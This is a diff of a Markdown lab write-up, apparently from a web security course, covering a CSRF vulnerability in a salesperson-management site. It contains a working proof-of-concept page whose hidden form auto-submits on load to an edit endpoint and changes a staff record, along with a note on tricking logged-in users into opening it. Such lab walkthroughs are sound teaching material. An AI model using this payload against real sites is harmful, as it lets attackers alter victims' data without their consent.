@@ -51,12 +51,12 @@ This attack is quite easy. As a logged in user, navigate to a salesperson page t
 ### Vulnerability #2: CSRF
 First, create an html document that contains a hidden form like this:
 
-``<html>
+```html
+<html>
   <head>
     <title>Nothing to see here</title>
   </head>
   <body onload="document.malScript.submit()">
-      <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">Feedback</a>
 	<form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=12" method="post" style="display: none;" name='malScript' target="res">
 	    <input type="text" name="first_name" value="wrednA" />
       	<input type="text" name="last_name" value="tteurT" />
@@ -64,7 +64,8 @@ First, create an html document that contains a hidden form like this:
       	<input type="text" name="email" value="howdidyoufallforthat@silly.net" />
 	</form>
   </body>
-</html>``
+</html>
+```
 
 An attacker can submit feedback with a link to this page, and any logged in user that clicks it will unknowingly change data.
 *Note: In my walkthrough, I use a file path to this HTML document. It does not need to be a file path, just any link that opens this document will perform the attack.*
